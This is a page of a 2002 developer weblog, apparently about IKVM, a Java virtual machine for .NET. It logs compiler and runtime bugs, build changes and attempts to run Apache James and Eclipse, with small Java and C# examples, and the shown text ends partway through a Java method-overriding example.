<div class="newsItems"><a name="a65"></a><div class="entry">
	<h3 class="entryTitle">Swamp</h3>
	<div class="entryBody">
		<P>I tried to get <A href="http://www.eclipse.org/">Eclipse</A> to run. This led to an interesting series of events:</P>
<UL>
<LI>I found that I didn't set the ProtectionDomain of a Class instance. Fixed. 
<LI>I found that FileOutputStream in append mode didn't work. Fixed. 
<LI>I found that Eclipse requires a 1.3.0 VM, but doesn't give any feedback whatsoever if the version isn't good enough. Workaround: ikvm -Djava.version=1.3.0 
<LI>The bytecode compiler didn't implement migrating uninitialized object references into and out of try-blocks. Fixed. 
<LI>The&nbsp;version of java.io.File.listFiles() that I used couldn't deal with the native method returning <EM>null</EM>. Fixed by getting the latest version from CVS. 
<LI>Classpath's java.net.URL has bug where it doesn't try its own pool of protocol handlers, if a factory is installed, but the factory refuses a particular protocol. In order to fix this, I first had to update my Classpath code, to get the most recent URL code (it changed quite a bit, but the bug is still there). 
<LI>After I got the latest version of Classpath from CVS, jikes would hang when compiling (it later turned out that jikes wasn't hanging, but that it was actually nAnt, but at that moment I suspected jikes). 
<LI>I downloaded a new version of jikes, 1.18 (the version I was using was 1.15), generally tried as sorts of stupid things (including accidentally deleting my whole Classpath tree). 
<LI>Not exactly sure why, but this whole exercize caused a number of bugs to appear when compiling classpath.dll. Here are some examples: 
<LI>When this code is compiled by jikes 1.15:<BR>class&nbsp;Outer {<BR>&nbsp;&nbsp;&nbsp; private static class Inner {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private Inner() {}<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new Inner() { };<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR>First of all, I don't why this is legal. IMO since the constructor of Inner is private, you shouldn't be able to instantiate in Outer, but Sun's 1.4 compiler compiles it, and so does jikes. However, jikes 1.15 actually emits code that calls the private constructor from the constructor of the anonymous class. This is clearly incorrect (and it is fixed in 1.18), but it took me a while before I had figured out what was going on. BTW, the "correct" compilation is to inject a synthetic constructor in Inner that accepts a reference to the Outer class (and has package accessibility). 
<LI>jikes doesn't generate <A href="https://lists.xcf.berkeley.edu/lists/advanced-java/2001-September/017523.html">Miranda</A> methods. Take the following class, for example:<BR>abstract class Foo implements Runnable {<BR>&nbsp;&nbsp;&nbsp; Foo() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; run();<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR>This compiles (and is legal). When <EM>javac</EM> compiles this code, it inserts an public abstract void run() method into Foo, this method is called a Miranda method. Older VMs (probably in the 1.0 time frame) didn't think the class was valid without this method. Jikes doesn't do this and IK.VM.NET&nbsp;couldn't handle that. Fixed. 
<LI>Access check for fields had a bug. java.awt.Component directly accesses the id field of several events, this is legal because in the java.awt.AWTEvent class the id field is declared protected (which also implies package accessibility). However, jikes 1.18 decided that the reference to the field should not be compiled as a reference to java.awt.AWTEvent.id, but to&nbsp;(e.g.) java.awt.event.ComponentEvent.id, perfectly legal, because the field is inherited, but the compiler incorrectly did the package accessibility check on the class name in the reference, instead of on the class name where the field is actually declared. Fixed.</LI></UL>
<P>At the moment I'm stuck on an exception that the .NET framework throws (when I'm compiling classpath.dll with ikvmc):</P>
<P><EM><FONT size=2>System.TypeLoadException: Method getBounds2D in type java.awt.Rectangle from assembly getBounds2D does not have an implementation.<BR>&nbsp;&nbsp; at System.Reflection.Emit.TypeBuilder.TermCreateClass(TypeToken handle, Module module)<BR>&nbsp;&nbsp; at System.Reflection.Emit.TypeBuilder.CreateType()</FONT></EM></P>
<P>I have no idea why this happens. Interestingly enough, it doesn't happen when I compile with jikes 1.15.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/22/2002 15:45:26 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=65"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=65">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 21 November 2002</h2></div>
<div class="newsItems"><a name="a64"></a><div class="entry">
	<h3 class="entryTitle">ikvmc</h3>
	<div class="entryBody">
		<P>Inspired by Stuart's comment to yesterday's post, I decided to clean up <EM>ikvmc </EM>a little to make it possible to compile executables.</P>
<P>Other changes:</P>
<UL>
<LI>it's now possible to specify&nbsp;an IL&nbsp;implementation of a native method in map.xml. At the moment this is used only for System.identityHashCode() to solve <A href="http://weblog.ikvm.net/PermaLink.aspx/60">this</A> issue. 
<LI>map.xml is now parsed using the XmlSerializer (see yesterday's post on why this is not a good idea) 
<LI>implemented a work-around for the stack overflow that occurred when the compiler couldn't find java.lang.ClassNotFoundException 
<LI>ikvm now supports -classpath switch (thanks dIon)</LI></UL>
<P>I've only compiled a simple Hello World type executable with ikvmc and&nbsp;here are some things to look out for:</P>
<UL>
<LI>all classes (or jars) that are referenced by the application must be specified (except for the Classpath classes) 
<LI>a reference (-reference:&lt;path&gt;) to the classpath.dll must be specified 
<LI>when compiling an executable the class containing the main method must be specified
<LI>code that expects to be loaded by the system classloader will probably not work. Statically compiled code will be loaded by the bootstrap (aka null) classloader.</LI></UL>
<P>Example:<BR>&nbsp;&nbsp;&nbsp; ikvmc -out:hello.exe -reference:bin/classpath.dll -main:Hello Hello.class</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/21/2002 12:53:45 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=64"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=64">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 20 November 2002</h2></div>
<div class="newsItems"><a name="a63"></a><div class="entry">
	<h3 class="entryTitle">map.xml</h3>
	<div class="entryBody">
		<P>I wasn't happy with the handling of map.xml, so I rewrote the code that deals with it to use XmlSerialization. Cool stuff, but it turns out to be&nbsp;totally unsuitable for this purpose. I only need to parse the xml file once (at startup of the VM), and the XmlSerializer generates a C# file (and compiles it) to do the parsing. This is great if you have to parse lots of files (that adhere to the same schema), but it is very wasteful (i.e. slow) if you only need to parse a single file.</P>
<P>After a lot of thinking, I came to the conclusion that I should statically generate an assembly from the map.xml file. In other words, compile it.</P>
<P>Other thoughts: I'm still trying to find ways to make implementing the classpath "native"&nbsp;methods easier (and more efficient, by getting rid of reflection) and I'm contemplating the following idea: Turning classpath.dll, ik.vm.net.dll &amp; the new compiled map.xml into a multi module assembly. This solves two problems: 1) The native methods implementations no longer have to be public, 2) native methods can be statically compiled against the <EM>non-native </EM>(i.e. compiled Java) code. Downside: more icky circular dependencies and it won't be possible anymore to run without a precompiled classpath.dll</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/20/2002 09:49:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=63"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=63">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 13 November 2002</h2></div>
<div class="newsItems"><a name="a62"></a><div class="entry">
	<h3 class="entryTitle">F.A.Q.</h3>
	<div class="entryBody">
		<P>I wrote a small F.A.Q. that hopefully answers most questions people have without them having to go read through the entire history of the project.</P>
<P>It lives <A href="http://weblog.ikvm.net/story.aspx/faq">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/13/2002 10:42:17 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=62"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=62">Comments [6]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 03 November 2002</h2></div>
<div class="newsItems"><a name="a61"></a><div class="entry">
	<h3 class="entryTitle">Conference</h3>
	<div class="entryBody">
		<P>Yesterday I arrived in <A href="http://keystone.snow.com/">Keystone, Colorado</A>&nbsp;for the <A href="http://www.softwaresummit.com/">Colorado Software Summit</A>, a most excellent Java&nbsp;&amp; XML conference.</P>
<P>I hope to get some hacking done this week, but if I don't it'll be because I'm having too much fun at the&nbsp;conference ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/03/2002 18:52:13 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=61"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=61">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 01 November 2002</h2></div>
<div class="newsItems"><a name="a60"></a><div class="entry">
	<h3 class="entryTitle">GetHashCode & reflection</h3>
	<div class="entryBody">
		<P>What is the output of the following code fragment?</P><PRE><FONT size=1>&nbsp;&nbsp;object o = "foo";<BR>&nbsp;&nbsp;Console.WriteLine(o.GetHashCode());<BR>&nbsp;&nbsp;Console.WriteLine(typeof(object).GetMethod("GetHashCode").Invoke(o, null));<BR>&nbsp;&nbsp;Console.WriteLine(typeof(string).GetMethod("GetHashCode").Invoke(o, null));</FONT><FONT size=1></PRE>
<P></FONT>.NET 1.0 says:</P><PRE>193410979<BR>23<BR>193410979</PRE>
<P>.NET 1.1 beta says:</P><PRE>193410979<BR>193410979<BR>193410979</PRE>
<P>Mono 0.13 says:</P><PRE>101574<BR>1554225471<BR>1554225471</PRE>
<P>Mono 0.16 says:</P><PRE>101574<BR>33369132<BR>101574</PRE>
<P>Note: the actual numbers are irrelevant, it matters if they match up or not.</P>
<P>.NET 1.1 is correct, the others aren't. The funny thing is, I just realised that&nbsp;IK.VM.NET currently depends (for its System.identityHashCode implementation) on the broken behavior.</P>
<P>.NET 1.0 only behaves this way for methods in String, for other types reflective method invocation works the same as a virtual method call.</P>
<P>In Mono 0.16 all&nbsp;reflective method invocations appear to be non-virtual.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/01/2002 14:41:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=60"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=60">Comments [5]</a>
		
		<br clear="all">
	</div>
</div><a name="a59"></a><div class="entry">
	<h3 class="entryTitle">Dependencies</h3>
	<div class="entryBody">
		<P>Thanks to Zoltan Varga for trying to compile IK.VM.NET on <A href="http://www.go-mono.com/">Mono</A>. He pointed out some problems:</P>
<UL>
<LI>I used the undocument C# <A href="http://www.iunknown.com/Weblog/fog0000000098.html">__arglist</A> keyword in my <EM><A href="http://java.sun.com/docs/books/vmspec/2nd-edition/html/Instructions2.doc9.html#multianewarray">multianewarray</A> </EM>helper method, but since Mono's C# compiler doesn't support that and it isn't part of the standard, I reworked that to get rid of the __arglist construct.</LI>
<LI>zlib.dll is a part managed part unmanaged dll, and thus it will not run on Mono. I removed the zlib.dll dependency and&nbsp;I've changed <EM>ikvmc</EM> and <EM>netexp </EM>to use java.util.zip.* from classpath.dll.</LI></UL>
<P>This change has introduced a circular dependency: <EM>ikvmc </EM>is used to generate classpath.dll, but it also depends&nbsp;on it.</P>
<P>Other changes:</P>
<UL>
<LI>started on <A href="http://nant.sourceforge.net">NAnt</A> build files, to support building the project outside of Visual Studio .NET, and (in the future) hopefully without platform dependencies.</LI>
<LI>All Classpath's native methods are now (at least partially) implemented, except for <EM>java.nio.*</EM></LI></UL>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/01/2002 11:01:07 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=59"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=59">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 29 October 2002</h2></div>
<div class="newsItems"><a name="a58"></a><div class="entry">
	<h3 class="entryTitle">java.lang.Thread issues</h3>
	<div class="entryBody">
		<P>I&nbsp;worked on java.lang.Thread and ran into two <EM>issues.</EM> In .NET it is not possible to:</P>
<UL>
<LI>obtain the <EM>interrupted </EM>status of a thread (other than the current thread)</LI>
<LI>test for Monitor ownership</LI></UL>
<P>I worked around the interrupted status issue by always returning false&nbsp;when you query a thread other than the current thread :-( and to&nbsp;test for&nbsp;Monitor ownership I do a Monitor.Wait on the object, with a timeout of 0. That works, but it isn't safe, because Wait temporarily&nbsp;releases the Monitor (if we do own it), and that could cause a deadlock :-(</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/29/2002 17:03:28 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=58"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=58">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 25 October 2002</h2></div>
<div class="newsItems"><a name="a57"></a><div class="entry">
	<h3 class="entryTitle">James works (sort of)</h3>
	<div class="entryBody">
		<P>James now works. Where works is defined as: accepts incoming e-mail via SMTP and allows me to read that e-mail through POP3.</P>
<P>I made some major changes to support reflection, still not completely done yet, but most&nbsp;reflection based code&nbsp;should work now. Also implemented support for Serialization.</P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/25/2002 16:55:13 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=57"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=57">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 22 October 2002</h2></div>
<div class="newsItems"><a name="a56"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Yet more James...</P>
<P>I managed to get James to start up! I had to implement a whole chunk of reflection stuff that I hadn't yet implemented. It still isn't anywhere near finished, but it is starting to look a lot better. The architecture is starting to shape up. One of these days I'm going to draw some pictures and write up something about the IKVM architecture, if I can find the time.</P>
<P>Thanks to Mark Wielaard for debugging the resources issue (see previous <A href="http://weblog.ikvm.net/commentview.aspx/55">item</A>).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/22/2002 20:58:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=56"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=56">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 17 October 2002</h2></div>
<div class="newsItems"><a name="a55"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>More James...</P>
<P>I changed the class loader to use only one dynamic assembly and tried to run James again. It still doesn't run:</P>
<P>Phoenix 4.0a4</P>
<P>Application <A href="file:///C:/james/apps/james.sar">file://C:/james/apps/james.sar</A> uses a deprecated packaging format.<BR>There was an uncaught exception:<BR>---------------------------------------------------------<BR>--- Message ---<BR>Unable to create BlockInfo as are unable to locate resource "org/apache/james/James.xinfo".<BR>--- Stack Trace ---<BR>org.apache.avalon.phoenix.interfaces.DeploymentException: Unable to create BlockInfo as are unable to locate resource "org/apache/james/James.xinfo".<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...DefaultDeployer.deploy<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...DefaultEmbeddor.deployFile<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...DefaultEmbeddor.deployFile<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...DefaultEmbeddor.deployFiles<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...DefaultEmbeddor.deployDefaultApplications<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...DefaultEmbeddor.execute<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...frontends.CLIMain.run<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...frontends.CLIMain.execute<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...frontends.CLIMain.main<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at java.lang.reflect.Method.invoke<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...launcher.Main.startup<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache...launcher.Main.main<BR>Caused by: org.apache....assembler.AssemblyException: Unable to create BlockInfo as are unable to locate resource "org/apache/james/James.xinfo".<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache....assembler.Assembler.getBlockInfo<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache....assembler.Assembler.buildBlock<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache....assembler.Assembler.buildBlocks<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; at org.apache....assembler.Assembler.assembleSar<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ... 12 more<BR>---------------------------------------------------------<BR>The log file may contain further details of error.<BR>Please check the configuration files and restart Phoenix.<BR>If the problem persists, contact the Avalon project.&nbsp; See<BR><A href="http://jakarta.apache.org/avalon">http://jakarta.apache.org/avalon</A> for more information.<BR>Shutting down Phoenix.</P>
<P>(I editted the stack trace a little so that it doesn't mess up the formatting of the page too much).</P>
<P>I have no idea what this means and I don't feel like debugging this. May be I'll revisit&nbsp;James in a while when I've implemented more stuff and&nbsp;have better debugging support.</P>
<P>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/17/2002 17:44:55 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=55"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=55">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 14 October 2002</h2></div>
<div class="newsItems"><a name="a54"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Back again...</P>
<P>Friday I tried to get <A href="http://jakarta.apache.org/james/index.html">James</A>&nbsp;(a mail server) to run under IKVM. First thing I ran into was the lack of support for <A href="http://java.sun.com/j2se/1.4.1/docs/guide/extensions/index.html">extensions</A>. That turned out to be easy to add. The next problem wasn't so easy to get around. I started getting TypeLoadExceptions. The only way this can happen is if there is a bug in IKVM or in the .NET runtime, because if a Java class cannot be found IKVM should throw a ClassNotFoundException or a NoClassDefError.</P>
<P>After much debugging I managed to isolate the problem as a bug the .NET runtime. <A href="http://www.frijters.net/TypeResolveBug.cs">Here</A> is a small C# reproduction.</P>
<P>The problem was triggered by the new extension class loader, which creates a second dynamic assembly to emit the dynamically generated .NET types in. It turns out that references from one dynamic assembly to another dynamic assembly sometimes do not result in an AppDomain.TypeResolve event. The trigger for this is that the type being referenced was first defined inside another TypeResolve event.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/14/2002 10:48:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=54"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=54">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 27 September 2002</h2></div>
<div class="newsItems"><a name="a53"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>More small changes:</P>
<UL>
<LI>Many more class file validation checks added</LI>
<LI>Cleaned up the starter executable <EM>ikvm</EM> and added support to run jars.</LI>
<LI>Fixed some bugs in NetExp</LI>
<LI>Fixed some bugs in stack trace handling</LI>
<LI>Added support for classes that implement interfaces without actually implementing the interface methods</LI></UL>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/27/2002 17:57:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=53"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=53">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 23 September 2002</h2></div>
<div class="newsItems"><a name="a52"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Many small changes, mostly to deal with incorrect class files and a few bug fixes:</P>
<UL>
<LI>Java threads now inherit their name from the .NET thread (for threads that aren't created in Java) and threads that are created in Java, set the name of the&nbsp;.NET thread to their Java name</LI>
<LI>JNI methods that do not exist now throw UnsatifiedLinkError</LI>
<LI>Added more checks to class file reader</LI>
<LI>Added the JavaException helper class to centralize all the dynamic exception creation (for things like NoClassDefFoundError, VerifyError, IncompatibleClassChangeError, etc.)</LI>
<LI>Improved stack trace handling for&nbsp;inner exceptions</LI>
<LI>Enforced access checks for base classes and interfaces</LI>
<LI>Added checks to enforce that base class is not an interface and checks to ensure implemented interfaces are in fact interfaces</LI>
<LI>Added check to prevent subclassing final classes</LI>
<LI>Fixed doubleToLongBits to return normalized NaN and implemented doubleToRawLongBits</LI>
<LI>Added support for calling interface methods on object references (required because it sometimes isn't possible to merge interface types, so the merged type will be Object), also added support for calling Object methods through invokeinterface.</LI>
<LI>Ported Java DoubleToString class (written by Jack Shirazi) that (hopefully) correctly converts a double to its string representation</LI>
<LI>Added support for abstract methods in non-abstract classes (which the JVM apparently allows)</LI></UL>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and <A href="http://www.frijters.net/ikvm.zip">source</A> snaphots.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/23/2002 12:38:26 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=52"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=52">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 12 September 2002</h2></div>
<div class="newsItems"><a name="a51"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>Fun with method overriding</STRONG></P>
<P>Given the following three classes:</P><FONT color=#0000ff size=2>
<P><FONT face="Courier, Monospace">package</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> p1;</FONT></P></FONT><FONT color=#0000ff size=2>
<P><FONT face="Courier, Monospace">public</FONT></FONT><FONT face="Courier, Monospace"><FONT size=2> </FONT><FONT color=#0000ff size=2>class</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> c1<BR></FONT></FONT><FONT size=2><FONT face="Courier, Monospace">{<BR>&nbsp;&nbsp; </FONT></FONT><FONT face="Courier, Monospace"><FONT color=#0000ff size=2>public</FONT><FONT size=2> </FONT><FONT color=#0000ff size=2>static</FONT><FONT size=2> </FONT><FONT color=#0000ff size=2>void</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> main(String[] args)<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp; {<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp; &nbsp;&nbsp; c1 o = </FONT></FONT><FONT face="Courier, Monospace" color=#0000ff size=2>new</FONT><FONT size=2><FONT face="Courier, Monospace"> c2();<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;o.m1();<BR></FONT></FONT><FONT size=2><FONT face="Courier, Monospace">&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;o.m2();</FONT></P>
<P><FONT face="Courier, Monospace">&nbsp;&nbsp; &nbsp;&nbsp; o = </FONT></FONT><FONT face="Courier, Monospace" color=#0000ff size=2>new</FONT><FONT size=2><FONT face="Courier, Monospace"> c3();<BR></FONT><FONT face="Courier, Monospace">&nbsp; &nbsp;&nbsp;&nbsp; o.m1();<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; o.m2();<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp; }</FONT></P>
<P></FONT><FONT face="Courier, Monospace"><FONT color=#0000ff size=2>&nbsp;&nbsp; public</FONT><FONT size=2> </FONT><FONT color=#0000ff size=2>void</FONT></FONT><FONT size=2><FONT face="Courier, Monospace"> m1()<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">System.out.println("c1.m1");<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp; }</FONT></P>
<P></FONT><FONT face="Courier, Monospace" color=#0000ff size=2>&nbsp;&nbsp; void</FONT><FONT size=2><FONT face="Courier, Monospace"> m2()<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </FONT><FONT face="Courier, Monospace">System.out.println("c1.m2");<BR></FONT><FONT face="Courier, Monospace">&nbsp;&nbsp; }<BR></FONT><FONT face="Courier, Monospace">}</FONT></P></FONT><FONT color=#0000ff size=2>
